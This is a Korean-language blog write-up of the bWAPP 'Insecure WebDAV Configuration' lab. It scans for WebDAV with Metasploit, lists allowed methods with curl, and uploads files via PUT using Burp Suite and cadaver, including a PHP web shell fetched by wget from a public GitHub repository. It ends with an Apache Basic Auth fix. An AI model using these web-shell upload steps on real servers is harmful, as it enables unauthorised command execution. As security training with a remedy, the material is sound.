---
title: "[bWAPP] 6. Security Misconfigurations - Insecure WebDAV Configuration"
---

<br>

## Security Misconfigurations

잘못된 보안 구성

잘못되거나 과도한 보안 설정으로 발생

<br>

<br>

## Insecure WebDAV Configuration

### Object

- bWAPP에 WebDAV 기능 활성화로 디렉토리 검색 및 악의적인 파일을 업로드하는 시나리오
- PUT Method를 이용해 WebDAV에 악의적인 파일을 업로드하는 취약점을 다뤄보자

<br>

### WebDAV

- 원격적으로 웹 서버를 제어할 수 있는 HTTP Protocol의 확장 기능
- 보안설정 미흡할 시 악성 스크립트가 포함된 파일 업로드하여 시스템에 침투 우려
- 기존 파일 수정하여 악의적인 행위 우려
- PUT Method를 허용하는 몇몇 서비스에서 악성 웹셸 업로드될 우려

| Method        | 내용                                                      |
| ------------- | --------------------------------------------------------- |
| GET           | 리소스를 취득할때 사용, URL 형식으로 웹서버로 리소스 요청 |
| HEAD          | 메세지 헤더 정보만 취득할 때 사용                         |
| POST          | 내용을 Body에 포함시켜 전송                               |
| PUT           | 헤더 이외에 메세지 전송 가능 / 웹서버에 파일 전송 가능    |
| TRACE         | 요청 리소스가 수신되는 경로 확인                          |
| OPTIONS       | 서버가 지원하는 메서드를 질의하여 응답으로 받음           |
| CONNECT       | 프락시 서버와 같은 중간 서버 경유시 사용                  |
| COPY / MOVE   | 리소스 파일 복사 / 이동                                   |
| LOCK / UNLOCK | 리소스와 파일이 overwrite되는 기능 ON / OFF               |

<br>

### 시나리오 - 난이도 : 하

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211014014739763.png" alt="image-20211014014739763" style="zoom:67%;" />

<br>

### /webdav/

[WebDAV] 클릭 시 목록 확인 가능

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/C%3A/Users/wjddj/EONION-TH3DB.github.io/imgimage-20211027015132130.png" alt="image-20211027015132130" style="zoom:80%;" />

<br>

### WebDav 사용 여부

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/C%3A/Users/wjddj/EONION-TH3DB.github.io/imgimage-20211027015102775.png" alt="image-20211027015102775" style="zoom: 50%;" />

- kali > msfdb start - 메타스플로잇 시작
- kali > msfconsole 
- msf6 > search webdav - 'webdav' 관련 exploit 코드
- msf6 > use auxiliary/scanner/http/webdav_scanner - 'webdav'의 사용 유무 체크
- msf6 auxiliary(scanner/http/webdav_scanner) > show options
- msf6 auxiliary(scanner/http/webdav_scanner) > set rhosts 비박스IP - 스캔할 대상
- msf6 auxiliary(scanner/http/webdav_scanner) > set path /webdav/ - 디렉토리 지정
- msf6 auxiliary(scanner/http/webdav_scanner) > exploit 

<br>

### 허용하는  HTTP Method 확인

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211015011438494.png" alt="image-20211015011438494" style="zoom: 62%;" />

- kali > curl -X OPTIONS http://비박스IP/webdav/ -i
- /webdav/ 디렉토리에서 사용가능한 메소드 거의 대부분이라는 것 확인

<br>

<br>

## BurpSuite

### BurpSuite - 1

BurpSuit를 통해 /webdav/에 임의의 파일 업로드 해보자(PUT 메서드 사용)

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211109235615469.png" alt="image-20211109235615469" style="zoom:58%;" />

- /webdav/ 페이지 패킷 잡음

<br>

### BurpSuite - 2

GET -> PUT으로 변경

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211109235812953.png" alt="image-20211109235812953" style="zoom:57%;" />

- 내용 "<h1>Eonion</h1>"인 파일 업로드하기 위해 intecept off

<br>

### BurpSuite - 3

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000106525.png" alt="image-20211110000106525" style="zoom:78%;" />

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211015013254384.png" alt="image-20211015013254384" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000209135.png" alt="image-20211110000209135" style="zoom:105%;" />

- PUT 메서드를 통해 웹 서버에 파일 업로드 가능

<br>

<br>

## Kali

### kali - 1

칼리를 이용해 악의적인 파일 업로드 해보자

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000329590.png" alt="image-20211110000329590" style="zoom:68%;" />

- Kali > wget [https://raw.githubusercontent.com/Wphackedhelp/php-webshells/master/PHP%20Shell.php](https://raw.githubusercontent.com/Wphackedhelp/php-webshells/master/PHP Shell.php) - 코드 다운로드
- Kali >  cadaver http://비박스IP/webdav/ - 'Webdav' 클라이언트인 'cadaver' 사용
- dav:/webdav/ > put 'PHP Shell.php' 

<br>

### Kali - 2

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000439457.png" alt="image-20211110000439457" style="zoom:80%;" />

- 웹 쉘을 통해 서버에 명령 수행 가능

<br>

<br>

## 대응방안 

### BeeBox

아파치 설정 파일

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000639656.png" alt="image-20211110000639656" style="zoom:69%;" />

- bee-box > sudo -s 
- bee-box > vi /etc/apache2/httpd.conf - 아파치 설정 파일
- 'Webdav' 활성화 되어있음

### BeeBox - 1

수정

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211015023134008.png" alt="image-20211015023134008" style="zoom:69%;" />

- Options IncludeNoExec : 초기 파일(index.html)이 존재하지 않을 경우 오류 창을 띄움(403에러)
- AuthType Basic : 인증 유형(Basic : 패스워드 암호화 X / Digest : 패스워드 암호화)
- AuthName [id] : 인증 시 사용할 사용자 계정
- AuthUserFile [password file] : 'password file' 경로
- Require user [id] : 해당 계정만 접근 허용

### BeeBox - 2

패스워드 파일 생성

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211015024634323.png" alt="image-20211015024634323" style="zoom:69%;" />

- bee-box > htpasswd -c [패스워드 파일] [생성 계정]
- bee-box > /etc/init.d/apache2 restart - 웹 서버 재시작

<br>

### 확인 - cadaver

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211015025027061.png" alt="image-20211015025027061" style="zoom:92%;" />

- cadaver 명령어로 위와 똑같이 접속 시 계정 정보 요구

<br>

### curl

<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211110000746252.png" alt="image-20211110000746252" style="zoom:58%;" />

- 위에서 HTTP 메소드를 알아내기 위해 사용했던 curl을 이용시 401 오류와 인증을 요구